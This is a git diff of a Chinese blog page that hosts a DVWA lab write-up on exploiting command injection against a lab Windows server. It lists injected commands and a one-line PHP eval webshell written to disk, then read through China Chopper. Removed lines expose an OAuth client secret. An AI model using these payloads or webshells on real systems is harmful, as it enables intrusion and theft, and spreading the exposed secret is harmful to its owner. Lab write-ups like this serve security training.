@@ -40,7 +40,8 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -427,7 +428,7 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        390
+                        370
                     </div>
                     
 
@@ -450,10 +451,10 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>操作机：windows XP</p>
+                <h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>操作机：windows XP</p>
 <p>目标机：windows 2003</p>
 <p>目标地址：<a href="http://172.16.12.2" target="_blank" rel="noopener">http://172.16.12.2</a></p>
-<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul>
 <li><p>学习远程命令执行的原理</p>
 </li>
 <li><p>学习如何分析PHP远程命令执行代码</p>
@@ -463,45 +464,46 @@
 </ul>
 <p>目标：</p>
 <p>获取网站根目录下的 flag.php 中的隐藏的信息</p>
-<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol>
 <li>登陆到 dvwa ，并把安全等级设为 “低”</li>
 </ol>
 <p><img src="https://i.loli.net/2019/10/29/SpXCPiBmJ4Dbsx9.png" alt="command-1.png"></p>
 <ol start="2">
 <li>测试远程命令执行漏洞</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;whoami</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/eF2kMByYJKTWlhb.png" alt="command-2.png"></p>
 <ol start="3">
 <li>查看当前目录下有哪些文件</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;dir</code><br><img src="https://i.loli.net/2019/10/29/Sre2yMXibf8EIlD.png" alt="command-3.png"></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/10/29/Sre2yMXibf8EIlD.png" alt="command-3.png"></p>
 <ol start="4">
 <li>使用目录遍历命令查找 flag.php 文件</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;for /r C:\phpStudy\WWW %i in (flag)  do @echo %i</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&for /r C:\phpStudy\WWW %i in (flag)  do @echo %i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/DmKPvyUwLtB8AfV.png" alt="command-4.png"></p>
 <ol start="5">
 <li>尝试使用 type 命令查看 flag.php 文件</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;type C:\phpStudy\WWW\flag.php</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&type C:\phpStudy\WWW\flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/ygxUH4VvKC78oTD.png" alt="command-5.png"></p>
 <p>发现无法查看 flag.php 文件</p>
 <ol start="6">
 <li>尝试查看当前目录下的 index.php</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;type index.php</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&type index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/dVTbP5kqhJQjngp.png" alt="command-6.png"></p>
 <p>index.php 文件能够查看，猜测可能是权限问题导致无法访问 flag.php</p>
 <ol start="7">
 <li>尝试写入 webshell，通过 webshell 来访问文件</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;echo ^&lt;? eval(@$_POST['a']) ; ?^&gt; &gt; test.php</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&echo ^<? eval(@$_POST['a']) ; ?^> > test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/1hcz4S2JtqpHM97.png" alt="command-7.png"></p>
 <ol start="8">
 <li>查看一句话木马是否写入成功</li>
 </ol>
-<p><code>127.0.0.1&amp;&amp;dir</code></p>
+<pre class="line-numbers language-text"><code class="language-text">127.0.0.1&&dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/10/29/t2QpLjwiPvl7fgO.png" alt="command-8.png"></p>
 <ol start="9">
 <li>使用中国菜刀连接 webshell，最后在 WWW 目录下查看 flag.php</li>
@@ -510,7 +512,7 @@
 <p><img src="https://i.loli.net/2019/10/29/5CGIbk7Sxh6MoKu.png" alt="command-10.png"></p>
 <p><img src="https://i.loli.net/2019/10/29/7OrUxqsuVyT5evo.png" alt="command-11.png"></p>
 <p><img src="https://i.loli.net/2019/10/29/fhptJuA9d3SCoLr.png" alt="command-14.png"></p>
-<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/weixin_34082177/article/details/91875850" target="_blank" rel="noopener">命令注入写webshell</a></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/weixin_34082177/article/details/91875850" target="_blank" rel="noopener">命令注入写webshell</a></p>
 <p><a href="https://blog.csdn.net/qq_29647709/article/details/81474552" target="_blank" rel="noopener">Windows命令行(cmd)下快速查找文件</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -562,28 +564,6 @@
     
 
     
-        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
-<link rel="stylesheet" href="/css/gitment.css">
-
-<div class="gitment-card card" data-aos="fade-up">
-    <div id="gitment-content" class="card-content"></div>
-</div>
-
-<script src="/libs/gitment/gitment.js"></script>
-<script>
-var gitment = new Gitment({
-    id: 'Tue Oct 29 2019 20:49:32 GMT+0800',
-    owner: '315053891',
-    repo: 'hhkk2334.github.io',
-    oauth: {
-        client_id: '2ba8ba1b984aa89bf7cf',
-        client_secret: 'eb1541997c7ddce00df527e897e7419e105f6b04'
-    }
-});
-
-gitment.render('gitment-content');
-</script>
-    
 
     
 
@@ -610,12 +590,11 @@ gitment.render('gitment-content');
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言本关和 13 关一样都是双注入，只是 “单引号” 改成了 “双引号”
-注入步骤
+                    <div class="summary">注入步骤
 尝试输入 username:用户名+双引号，password:随便输
 
 
-注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT u</div>
+注：这边不太好判断出 SQL 语句，从后台可以看到 SQL 语句：SELECT username, password FROM users WHERE us</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
@@ -664,11 +643,11 @@ gitment.render('gitment-content');
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言本关和同Less5和Less6：正确回显是固定字符串（无回显）这里页面显示flag.jpg这张图片；错误回显是Mysql错误信息，这里页面显示slap.jpg这张图片。
+                    <div class="summary">注入步骤
+尝试输入 username:用户名+单引号，password:随便输
 
 
-注入步骤
-尝试输入 username:用户名+单引号，pass</div>
+注：从报错中可以判断出SQL语句：SELECT username, password FROM users WHERE username=(‘admin’)</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-28
@@ -889,5 +868,6 @@ gitment.render('gitment-content');
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
 
 
+<script src="/live2d-widget/autoload.js"></script>
 </body>
 </html>
